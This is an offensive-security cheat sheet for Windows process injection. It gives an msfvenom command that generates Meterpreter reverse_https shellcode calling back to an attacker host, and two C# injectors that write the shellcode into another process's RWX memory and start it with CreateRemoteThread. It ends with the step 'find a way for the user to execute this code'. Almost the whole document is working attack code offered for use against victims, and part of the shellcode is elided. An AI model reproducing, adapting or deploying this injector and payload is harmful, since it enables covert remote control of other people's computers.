# Process Injection to Another Program Reverse Shell

### 1) Find the PID of the process that we want to inject

    tasklist /FI "IMAGENAME eq [PROGRAM_CHOSEN].exe"

OR

    Get-Process | Where-Object {$_.Path -like "*[PROGRAM_CHOSEN].exe*"}

### 2) Generate shellcode

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] EXITFUNC=thread -f csharp

### 3) Create new VS Project

New Project > .NET Standard Console App

### 4) Inject shellcode and PID into code

    using System;
    using System.Runtime.InteropServices;
    
    namespace Inject
    {
        class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    
            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            static void Main(string[] args)
            {
                // Replace the PID
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, [PID]);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
    
                // Replace the shellcode
                byte[] buf = new byte[591] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                ....
                0x0a,0x41,0x89,0xda,0xff,0xd5 };
                            IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
    
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
        }
    }

#### Alternate option to find the PID Dynamically

    using System;
    using System.Runtime.InteropServices;
    
    
    namespace Inject
    {
        class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    
            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            static void Main(string[] args)
            {
                // Find the PID by Name: eg. explorer
                Process[] expProc = Process.GetProcessesByName("[PROGRAM_CHOSEN]");
                int pid = expProc[0].Id;
                
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
    
                // Replace the shellcode
                byte[] buf = new byte[591] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                ....
                0x0a,0x41,0x89,0xda,0xff,0xd5 };
                            IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
    
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
        }
    }

### 5) Compile for release

### 6) Find a way for the user to execute this code

